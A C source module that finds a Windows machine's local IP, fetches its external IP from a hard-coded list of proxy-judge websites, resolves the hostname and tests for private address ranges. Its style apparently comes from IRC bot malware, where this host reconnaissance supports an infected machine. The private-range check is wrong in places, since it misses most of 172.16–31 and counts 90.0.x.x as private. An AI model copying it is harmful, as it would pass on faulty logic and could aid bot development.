#include "includes.h"
#include "functions.h"

extern char str_exip_resolve[];

char *GetIP(SOCKET sock)
{
	static char IP[16];

	SOCKADDR sa;
	int sas = sizeof(sa);
	ZeroMemory(&sa,sizeof(sa));
	fgetsockname(sock, &sa, &sas);

	sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (IP);
}

IPSITES ipsites[]={


	//all work as of oct 2006
	{"http://www.kinchan.net/cgi-bin/proxy.cgi","REMOTE_ADDR="},
	{"http://69web.net/cgi-bin/pj.cgi","REMOTE_ADDR="},
	{"http://shigeru.page.ne.jp/for/prxjdg.cgi","REMOTE_ADDR="},
	{"http://www2.dokidoki.ne.jp/tomocrus/cgi-bin/check/prxjdg.cgi","REMOTE_ADDR="},
	{"http://szlanna.com/prxjdg.cgi","REMOTE_ADDR="},
	{"http://iloveproxy.com/prxjdg.cgi","REMOTE_ADDR="},
};

char *GetExternalIp(void)
{
	HINTERNET httpopen, openurl;
	char buffer[10240];
	char tbuffer[10240];
	static char ip[MAX_IP];
	int sitecount=(sizeof(ipsites)/sizeof(IPSITES));
	int csite=rand()%(sitecount);
	for (int u=0;u<sitecount;u++)
		ipsites[u].tried=FALSE;
	
	if (ip[0] == '\0')
	{

		DWORD read=0;
		char *check;

		int i=0;
		for (i=0;i<=10;i++)
		{
			for (int t=0;t<sitecount*2;t++)
			{
				if (ipsites[csite].tried==TRUE)
					csite=rand()%(sitecount);
				else
					break;
			}

			httpopen=fInternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			openurl=fInternetOpenUrl(httpopen,ipsites[csite].site, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
			if (!openurl)
				return 0;

			fInternetReadFile(openurl, buffer, sizeof(buffer), &read);

			check = strstr(buffer,ipsites[csite].match);
			if (check)
			{
				sprintf(tbuffer,"%s%%s",ipsites[csite].match);
				sscanf(check,tbuffer,ip);
				if (ip)
				{
					fInternetCloseHandle(httpopen);
					fInternetCloseHandle(openurl);
					return ip;
				}
			}
			else
			{
				ipsites[csite].tried=TRUE;
				csite=rand()%(sitecount);
			}
		}
	}
#ifdef _DEBUG
	printf("GetExternalIp: Recieved From: %s (%i/%i) (%d)\n",ipsites[csite].site,csite,sitecount,read);
#endif
    return ip;
}

DWORD WINAPI GetExIP(LPVOID param) 
{
	char *tip=GetExternalIp();
	if (!tip)
	{
		strncpy(exip,inip,sizeof(exip));
	}
	else
		strncpy(exip,tip,sizeof(exip));

	DWORD addr=finet_addr(exip);  
	HOSTENT *hostent=fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       strncpy(host,hostent->h_name,sizeof(host));
    else 
		strncpy(host,str_exip_resolve,sizeof(host));

	ExitThread(0);
}

BOOL PrivateIP(const char *ip) {
	if(!ip) return FALSE; if(!strcmp(ip, "")) return FALSE;
	char *tokens[4]; char ipbuf[32];
	strncpy(ipbuf, ip, 32);
	tokens[0]=strtok(ipbuf, ".");
	if(!tokens[0]) return FALSE;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return FALSE; }
	if(!strcmp(tokens[0], "10")) return TRUE;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return TRUE;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return TRUE;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return TRUE;	// Class Bastart private network :P
	return FALSE;
}
